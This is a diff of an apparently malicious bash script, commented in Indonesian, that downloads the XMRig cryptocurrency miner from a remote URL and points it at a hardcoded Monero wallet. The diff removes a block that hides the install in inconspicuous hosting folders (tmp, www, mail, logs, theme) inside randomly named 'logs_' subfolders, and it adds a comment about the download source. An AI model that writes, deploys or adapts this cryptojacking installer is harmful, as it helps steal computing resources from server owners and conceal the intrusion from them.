@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # --- CONFIG ---
+# rubah agar mendownload dari https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 MINER_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
 MINER_FILE="xmrig"
 WALLET="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
@@ -18,41 +19,6 @@ whoami=$(whoami)
 flush_output() {
     echo -e "$1"
 }
-
-# --- Pilih Folder Dasar ---
-parent_dir="$(dirname "$(pwd)")"
-possible_dirs=("tmp" "www" "mail" "logs" "theme")
-BASE_DIR=""
-
-for dir in "${possible_dirs[@]}"; do
-    full_path="$parent_dir/$dir"
-    if [ -d "$full_path" ]; then
-        BASE_DIR="$full_path"
-        flush_output "[*] Folder '$dir' ditemukan di $full_path, menggunakan sebagai lokasi instalasi."
-        break
-    else
-        flush_output "[*] Folder '$dir' tidak ditemukan di $full_path."
-    fi
-done
-
-if [ -z "$BASE_DIR" ]; then
-    BASE_DIR="$(pwd)/wpp"
-    flush_output "[*] Tidak ada folder yang ditemukan, membuat folder custom 'wpp' di $BASE_DIR."
-fi
-
-# Jika BASE_DIR adalah restricted, buat folder acak di dalamnya
-restricted_dirs=("tmp" "www" "mail" "logs" "theme")
-if [[ " ${restricted_dirs[@]} " =~ " $(basename "$BASE_DIR") " ]]; then
-    random_folder="logs_$(openssl rand -hex 4)"
-    BASE_DIR="$BASE_DIR/$random_folder"
-    if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
-        flush_output "[x] ERROR: Gagal membuat folder random '$random_folder' di $BASE_DIR. Periksa permissions."
-        exit 1
-    fi
-    flush_output "[*] ($(basename "$BASE_DIR")): membuat folder random '$random_folder' di $BASE_DIR."
-fi
-
-cd "$BASE_DIR" || exit 1
 
 # --- Get Public IP ---
 get_ip() {
